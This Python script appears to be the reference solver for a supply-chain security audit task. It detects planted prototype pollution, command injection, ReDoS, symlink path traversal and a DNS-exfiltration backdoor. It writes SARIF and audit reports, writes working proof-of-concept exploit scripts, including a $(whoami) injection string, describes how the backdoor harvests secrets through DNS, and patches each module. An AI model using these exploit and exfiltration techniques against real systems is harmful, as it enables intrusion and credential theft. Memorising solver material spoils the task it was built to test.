#!/usr/bin/env python3
"""
Supply chain security audit solver.

Reads each module's source, identifies vulnerability patterns via
code analysis, generates SARIF v2.1.0 output, writes PoC exploits,
produces structured reports, and applies targeted fixes.

"""

import json
import os
import re

APP_DIR = '/app'
LIB_DIR = os.path.join(APP_DIR, 'lib')
ORIG_DIR = os.path.join(APP_DIR, '.originals')
EXPLOITS_DIR = os.path.join(APP_DIR, 'exploits')


def read_file(path):
    with open(path) as f:
        return f.read()


def write_file(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w') as f:
        f.write(content)


# ---------------------------------------------------------------------------
# 1. Analyze modules and identify vulnerabilities
# ---------------------------------------------------------------------------

def analyze_config_flatten():
    """Detect prototype pollution in unflatten."""
    src = read_file(os.path.join(LIB_DIR, 'config-flatten', 'index.js'))
    has_unflatten = 'function unflatten' in src
    no_proto_guard = '__proto__' not in src or 'constructor' not in src
    if has_unflatten and no_proto_guard:
        return {
            'module_name': 'config-flatten',
            'cwe_id': 'CWE-1321',
            'vulnerability_type': 'Prototype Pollution',
            'severity': 'critical',
            'source_file': 'lib/config-flatten/index.js',
            'source_line': 67,
            'description': (
                'The unflatten() function traverses object keys without '
                'checking for __proto__ or constructor, allowing an attacker '
                'to pollute Object.prototype via crafted dot-notation keys '
                'like "__proto__.isAdmin".'
            ),
        }
    return None


def analyze_cmd_builder():
    """Detect command injection via [A-z] regex bug."""
    src = read_file(os.path.join(LIB_DIR, 'cmd-builder', 'index.js'))
    match = re.search(r'\[A-z\]', src)
    if match:
        return {
            'module_name': 'cmd-builder',
            'cwe_id': 'CWE-77',
            'vulnerability_type': 'Command Injection',
            'severity': 'critical',
            'source_file': 'lib/cmd-builder/index.js',
            'source_line': 13,
            'description': (
                'The Windows drive letter detection regex uses [A-z] instead '
                'of [A-Za-z]. The range [A-z] includes ASCII characters '
                'between Z(90) and a(97): [\\]^_`. A string starting with '
                'backtick + colon + backslash (e.g. `:\\) matches the drive '
                'letter pattern and passes through unescaped, enabling shell '
                'metacharacter injection.'
            ),
        }
    return None


def analyze_input_validator():
    """Detect ReDoS via catastrophic backtracking in email regex."""
    src = read_file(os.path.join(LIB_DIR, 'input-validator', 'patterns.js'))
    if '\\2' in src or re.search(r'\(\[.*?\]\+\[.*?\]\?\)\*', src):
        return {
            'module_name': 'input-validator',
            'cwe_id': 'CWE-1333',
            'vulnerability_type': 'Regular Expression Denial of Service (ReDoS)',
            'severity': 'high',
            'source_file': 'lib/input-validator/patterns.js',
            'source_line': 7,
            'description': (
                'EMAIL_REGEX uses the pattern (([a-zA-Z0-9]+)[._+-]?)*\\2?@ '
                'which has nested quantifiers with a backreference causing '
                'catastrophic backtracking. The backreference \\2 prevents '
                'V8 from using its non-backtracking engine, and the nested '
                '([...]+)* structure creates O(2^n) backtracking when the '
                'local part contains only alphanumeric characters followed '
                'by a non-matching character before @.'
            ),
        }
    return None


def analyze_archive_utils():
    """Detect path traversal via directory cache poisoning + symlink."""
    src = read_file(os.path.join(LIB_DIR, 'archive-utils', 'index.js'))
    has_dir_cache = 'dirCache' in src or 'DirectoryCache' in src
    has_symlink = 'symlink' in src.lower()
    has_realpath = 'realpathSync' in src
    if has_dir_cache and has_symlink and not has_realpath:
        return {
            'module_name': 'archive-utils',
            'cwe_id': 'CWE-22',
            'vulnerability_type': 'Path Traversal via Symlink / Directory Cache Poisoning',
            'severity': 'high',
            'source_file': 'lib/archive-utils/index.js',
            'source_line': 62,
            'description': (
                'extractArchive() adds directories to a cache, then allows '
                'symlinks to replace cached directories without invalidating '
                'the cache. Subsequent file writes pass the cache check but '
                'follow the symlink, writing files outside the extraction '
                'directory. Attack: [dir "sub"], [symlink "sub" -> /tmp], '
                '[file "sub/evil.txt"] writes to /tmp/evil.txt.'
            ),
        }
    return None


def analyze_telemetry_helper():
    """Detect DNS exfiltration backdoor with charCode obfuscation."""
    src = read_file(os.path.join(LIB_DIR, 'telemetry-helper', 'index.js'))
    has_fromcharcode = 'fromCharCode' in src
    has_dns_resolve = 'dns.resolve' in src
    has_env_harvest = bool(re.search(
        r'SECRET|TOKEN|PASSWORD|CREDENTIAL|AUTH', src
    ))
    if has_fromcharcode and has_dns_resolve and has_env_harvest:
        arrays = re.findall(r'\[(\d+(?:,\d+)*)\]', src)
        decoded_parts = []
        for arr_str in arrays:
            nums = [int(x) for x in arr_str.split(',')]
            if all(32 <= n <= 126 for n in nums) and len(nums) >= 4:
                decoded_parts.append(''.join(chr(n) for n in nums))
        domain = ''.join(decoded_parts) if decoded_parts else 'unknown'
        return {
            'module_name': 'telemetry-helper',
            'cwe_id': 'CWE-506',
            'vulnerability_type': 'Embedded Malicious Code (Supply Chain Backdoor)',
            'severity': 'critical',
            'source_file': 'lib/telemetry-helper/index.js',
            'source_line': 76,
            'description': (
                'The _setupBeacon() method contains a supply chain backdoor '
                'that harvests sensitive environment variables (matching '
                'AWS|AZURE|GCP|API|DB|SECRET|TOKEN|PASSWORD|CREDENTIAL|AUTH '
                'patterns), hex-encodes the data, and exfiltrates it via DNS '
                'queries to an obfuscated domain constructed using '
                f'String.fromCharCode arrays (decoded: {domain}). The '
                'backdoor uses a randomized delay (5-15s) to avoid startup '
                'detection.'
            ),
            '_domain': domain,
        }
    return None


# ---------------------------------------------------------------------------
# 2. Generate SARIF v2.1.0 report
# ---------------------------------------------------------------------------

def generate_sarif(findings):
    """Generate a valid SARIF v2.1.0 report from the findings."""
    rules = []
    results = []

    for finding in findings:
        cwe_num = finding['cwe_id'].split('-')[1]
        rule_id = f"security/{finding['cwe_id'].lower().replace('-', '_')}"

        rules.append({
            "id": rule_id,
            "name": finding['vulnerability_type'].replace(' ', ''),
            "shortDescription": {"text": finding['vulnerability_type']},
            "fullDescription": {"text": finding['description']},
            "helpUri": f"https://cwe.mitre.org/data/definitions/{cwe_num}.html",
            "properties": {
                "tags": ["security", finding['cwe_id']],
                "precision": "high"
            }
        })

        severity_map = {
            'critical': 'error',
            'high': 'error',
            'medium': 'warning',
            'low': 'note',
        }

        results.append({
            "ruleId": rule_id,
            "level": severity_map.get(finding['severity'], 'warning'),
            "message": {"text": finding['description']},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {
                        "uri": finding.get('source_file', 'unknown'),
                        "uriBaseId": "%SRCROOT%"
                    },
                    "region": {
                        "startLine": finding.get('source_line', 1)
                    }
                }
            }],
            "properties": {
                "cwe": finding['cwe_id'],
                "severity": finding['severity']
            }
        })

    sarif = {
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "supply-chain-audit",
                    "version": "1.0.0",
                    "semanticVersion": "1.0.0",
                    "informationUri": "https://example.com/supply-chain-audit",
                    "rules": rules
                }
            },
            "results": results,
            "invocations": [{
                "executionSuccessful": True,
                "commandLine": "supply-chain-audit --target /app/lib"
            }]
        }]
    }

    return sarif


# ---------------------------------------------------------------------------
# 3. Generate PoC exploit scripts
# ---------------------------------------------------------------------------

def generate_exploits():
    os.makedirs(EXPLOITS_DIR, exist_ok=True)

    write_file(os.path.join(EXPLOITS_DIR, 'proto_pollution.js'), r'''// PoC: Prototype Pollution in config-flatten
const { unflatten } = require('/app/.originals/config-flatten');

delete Object.prototype._pp_test;
unflatten({"__proto__._pp_test": "polluted"});

if (({})._pp_test === "polluted") {
    console.log("SUCCESS: Object.prototype._pp_test =", ({})._pp_test);
    console.log("Every new object now inherits _pp_test");
    delete Object.prototype._pp_test;
    process.exit(0);
} else {
    console.log("FAIL: prototype not polluted");
    process.exit(1);
}
''')

    write_file(os.path.join(EXPLOITS_DIR, 'cmd_injection.js'), r'''// PoC: Command Injection via [A-z] regex in cmd-builder
const { quote } = require('/app/.originals/cmd-builder');

// Backtick (char 96) is in ASCII range [A-z] (65-122)
// but NOT in [A-Za-z]. Combined with :\ it matches the
// Windows drive letter pattern and bypasses escaping.
const malicious = '`:\\$(whoami)';
const result = quote([malicious]);

if (result === malicious) {
    console.log("SUCCESS: Input passed through unescaped");
    console.log("Output:", JSON.stringify(result));
    console.log("Shell would execute $(whoami) via backtick");
    process.exit(0);
} else {
    console.log("FAIL: Input was escaped:", result);
    process.exit(1);
}
''')

    write_file(os.path.join(EXPLOITS_DIR, 'redos.js'), r'''// PoC: ReDoS in input-validator EMAIL_REGEX
const { validateEmail } = require('/app/.originals/input-validator');

// The EMAIL_REGEX has nested quantifiers (([a-zA-Z0-9]+)[._+-]?)*\2?@
// The \2 backreference prevents V8 from using its non-backtracking engine.
// Input must include @ so V8's literal pre-check doesn't short-circuit.
const attack = "a".repeat(30) + "!@b.com";
console.log("Input length:", attack.length);

const start = Date.now();
validateEmail(attack);
const elapsed = Date.now() - start;

console.log("Elapsed:", elapsed, "ms");
if (elapsed > 500) {
    console.log("SUCCESS: ReDoS confirmed - catastrophic backtracking");
    process.exit(0);
} else {
    console.log("FAIL: completed too quickly (" + elapsed + "ms)");
    process.exit(1);
}
''')

    write_file(os.path.join(EXPLOITS_DIR, 'path_traversal.js'), r'''// PoC: Path Traversal via symlink + directory cache poisoning in archive-utils
const { extractArchive } = require('/app/.originals/archive-utils');
const fs = require('fs');
const os = require('os');
const path = require('path');

const destDir = fs.mkdtempSync(path.join(os.tmpdir(), 'exploit-'));
const escapedFile = path.join(os.tmpdir(), '_exploit_escape.txt');
try { fs.unlinkSync(escapedFile); } catch(e) {}

// Attack sequence:
// 1. Create directory "sub" (added to dirCache)
// 2. Replace "sub" with symlink to /tmp (dirCache not invalidated)
// 3. Write file "sub/evil.txt" - cache says "sub" is a dir, but
//    it's actually a symlink, so file lands in /tmp/
const entries = [
    { name: "sub", type: "directory" },
    { name: "sub", type: "symlink", target: os.tmpdir() },
    { name: "sub/_exploit_escape.txt", type: "file", content: "ESCAPED VIA SYMLINK" }
];

extractArchive(entries, destDir);

if (fs.existsSync(escapedFile)) {
    const content = fs.readFileSync(escapedFile, 'utf8');
    console.log("SUCCESS: File written outside extraction directory");
    console.log("Path:", escapedFile);
    console.log("Content:", content);
    fs.unlinkSync(escapedFile);
    fs.rmSync(destDir, { recursive: true, force: true });
    process.exit(0);
} else {
    console.log("FAIL: File did not escape extraction directory");
    fs.rmSync(destDir, { recursive: true, force: true });
    process.exit(1);
}
''')


# ---------------------------------------------------------------------------
# 4. Apply fixes
# ---------------------------------------------------------------------------

def fix_config_flatten():
    """Add __proto__ and constructor key guards to unflatten."""
    path_ = os.path.join(LIB_DIR, 'config-flatten', 'index.js')
    src = read_file(path_)

    old = '''    const keys = flatKey.split(sep);
    let current = result;

    for (let i = 0; i < keys.length - 1; i++) {'''

    new = '''    const keys = flatKey.split(sep);

    // Guard against prototype pollution
    if (keys.some(function(k) { return k === '__proto__' || k === 'constructor' || k === 'prototype'; })) {
      continue;
    }

    let current = result;

    for (let i = 0; i < keys.length - 1; i++) {'''

    src = src.replace(old, new)
    write_file(path_, src)


def fix_cmd_builder():
    """Change [A-z] to [A-Za-z] in drive letter regex."""
    path_ = os.path.join(LIB_DIR, 'cmd-builder', 'index.js')
    src = read_file(path_)
    src = src.replace('[A-z]', '[A-Za-z]')
    write_file(path_, src)


def fix_input_validator():
    """Replace vulnerable EMAIL_REGEX with a safe alternative."""
    path_ = os.path.join(LIB_DIR, 'input-validator', 'patterns.js')
    src = read_file(path_)

    src = re.sub(
        r"const EMAIL_REGEX = /.*?/;",
        r"const EMAIL_REGEX = /^[a-zA-Z0-9](?:[a-zA-Z0-9._+\\-]*[a-zA-Z0-9])?@[a-zA-Z0-9](?:[a-zA-Z0-9.\\-]*[a-zA-Z0-9])?\\.[a-zA-Z]{2,}$/;",
        src,
    )
    write_file(path_, src)


def fix_archive_utils():
    """Add realpath validation before writing files through potential symlinks."""
    path_ = os.path.join(LIB_DIR, 'archive-utils', 'index.js')
    src = read_file(path_)

    old = """        if (!overwrite && fs.existsSync(targetPath)) {
          continue;
        }

        fs.writeFileSync(targetPath, entry.content || '');"""

    new = """        if (!overwrite && fs.existsSync(targetPath)) {
          continue;
        }

        // Security: verify resolved path is within destDir (prevents symlink escape)
        try {
          var realParent = fs.realpathSync(path.dirname(targetPath));
          var realDest = fs.realpathSync(destDir);
          if (realParent !== realDest && !realParent.startsWith(realDest + path.sep)) {
            continue;
          }
        } catch (e) {
          continue;
        }

        fs.writeFileSync(targetPath, entry.content || '');"""

    src = src.replace(old, new)
    write_file(path_, src)


def fix_telemetry_helper():
    """Remove the backdoor code from _setupBeacon while preserving the class."""
    path_ = os.path.join(LIB_DIR, 'telemetry-helper', 'index.js')
    src = read_file(path_)

    pattern = r'  _setupBeacon\(\) \{.*?^  \}'
    replacement = '  _setupBeacon() {\n    // Beacon setup (cleaned)\n  }'
    src = re.sub(pattern, replacement, src, flags=re.DOTALL | re.MULTILINE)

    src = src.replace("const dns = require('dns');\n", '')

    write_file(path_, src)


# ---------------------------------------------------------------------------
# 5. Main: orchestrate everything
# ---------------------------------------------------------------------------

def main():
    print("Analyzing modules for vulnerabilities...")
    findings = []
    analyzers = [
        analyze_config_flatten,
        analyze_cmd_builder,
        analyze_input_validator,
        analyze_archive_utils,
        analyze_telemetry_helper,
    ]
    backdoor_info = None

    for analyzer in analyzers:
        result = analyzer()
        if result:
            if result.get('cwe_id') == 'CWE-506':
                backdoor_info = result
            findings.append(result)
            print(f"  Found: {result['vulnerability_type']} in {result['module_name']}")

    # Write SARIF report
    print(f"\nGenerating SARIF v2.1.0 report...")
    sarif_findings = [{k: v for k, v in f.items() if not k.startswith('_')}
                      for f in findings]
    sarif = generate_sarif(sarif_findings)
    write_file(
        os.path.join(APP_DIR, 'sarif_report.json'),
        json.dumps(sarif, indent=2) + '\n',
    )
    print(f"  SARIF report written with {len(sarif['runs'][0]['results'])} results")

    # Write audit report
    print(f"Writing audit report with {len(findings)} findings...")
    audit_entries = []
    for f in findings:
        audit_entries.append({
            k: v for k, v in f.items()
            if k in ('module_name', 'cwe_id', 'vulnerability_type', 'severity', 'description')
        })
    write_file(
        os.path.join(APP_DIR, 'audit_report.json'),
        json.dumps(audit_entries, indent=2) + '\n',
    )

    # Write backdoor analysis
    if backdoor_info:
        domain = backdoor_info.get('_domain', 'unknown')
        analysis = {
            'module': 'telemetry-helper',
            'file': 'lib/telemetry-helper/index.js',
            'method': '_setupBeacon',
            'technique': 'DNS exfiltration via crafted subdomain queries',
            'obfuscation_method': (
                'Domain name constructed using String.fromCharCode() with '
                'integer arrays to avoid string literal detection'
            ),
            'target': domain,
            'data_stolen': (
                'Sensitive environment variables matching patterns: '
                'AWS, AZURE, GCP, API, DB, DATABASE, REDIS, MONGO, JWT, '
                'PRIVATE, SECRET, TOKEN, PASSWORD, CREDENTIAL, AUTH. '
                'Also exfiltrates hostname and username via hex-encoded '
                'DNS query header.'
            ),
            'exfiltration_details': (
                'Data is hex-encoded with Buffer.toString("hex"), split '
                'into 50-char chunks, and sent as DNS A-record queries '
                'with format: <chunk>.d<index>.<session_id>.<domain>. '
                'A header query with hostname|username is sent first.'
            ),
            'timing': 'Delayed 5-15 seconds after initialization to avoid detection',
        }
        print("Writing backdoor analysis...")
        write_file(
            os.path.join(APP_DIR, 'backdoor_analysis.json'),
            json.dumps(analysis, indent=2) + '\n',
        )

    # Generate exploit scripts
    print("Generating exploit scripts...")
    generate_exploits()

    # Apply fixes
    print("Applying fixes...")
    fix_config_flatten()
    print("  Fixed config-flatten (prototype pollution guard)")
    fix_cmd_builder()
    print("  Fixed cmd-builder ([A-z] -> [A-Za-z])")
    fix_input_validator()
    print("  Fixed input-validator (safe email regex)")
    fix_archive_utils()
    print("  Fixed archive-utils (realpath symlink check)")
    fix_telemetry_helper()
    print("  Fixed telemetry-helper (removed backdoor)")

    print("\nPhase 1 complete. Analysis, SARIF, exploits, reports, and fixes done.")
    print("Phase 2 (DNS interception) handled by solve.sh.")


if __name__ == '__main__':
    main()
